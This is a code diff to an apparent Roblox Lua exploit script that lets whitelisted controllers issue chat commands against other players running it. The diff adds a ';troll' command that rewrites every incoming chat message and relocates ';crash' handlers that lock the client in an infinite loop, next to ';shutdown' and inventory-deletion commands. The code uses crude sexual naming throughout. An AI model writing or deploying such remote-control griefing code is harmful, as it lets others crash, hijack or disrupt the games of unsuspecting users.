@@ -5,7 +5,7 @@ local Notify = function(_Title, _Text , Time)
 end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
-local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash,retags,lava,dead⭐"
+local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash,retags,lava,dead,troll⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -282,11 +282,6 @@ TextLabel.TextWrapped = true
 wait(0.5)
 game.Players.LocalPlayer.PlayerGui.flash:Destroy()
 elseif cmd == ";flash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
-while true do end
-
-elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
-while true do end
-elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 local flash = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -316,6 +311,49 @@ TextLabel.TextSize = 14.000
 TextLabel.TextWrapped = true
 wait(0.5)
 game.Players.LocalPlayer.PlayerGui.flash:Destroy()
+
+
+elseif cmd == ";troll" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+local textChatService = game:GetService("TextChatService")
+textChatService.MessageReceived:Connect(function(sex)
+local args = sex.Text:split(" ")
+for i,v in(args) do
+args[i] = "weiner";end
+local wiwi = ""
+for i,v in(args) do
+    if 1 == #args then
+        wiwi = wiwi..v
+        else
+        wiwi = wiwi..v.." "
+    end
+    end
+    sex.Text = wiwi
+    print("troll credits to Nathan / _amnoob")
+end)
+elseif cmd == ";troll" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+local textChatService = game:GetService("TextChatService")
+textChatService.MessageReceived:Connect(function(sex)
+local args = sex.Text:split(" ")
+for i,v in(args) do
+args[i] = "weiner";end
+local wiwi = ""
+for i,v in(args) do
+    if 1 == #args then
+        wiwi = wiwi..v
+        else
+        wiwi = wiwi..v.." "
+    end
+    end
+    sex.Text = wiwi
+    print("troll credits to Nathan / _amnoob")
+end)
+
+
+
+elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+while true do end
+elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+while true do end
 
 elseif cmd == ";shutdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 game:shutdown()
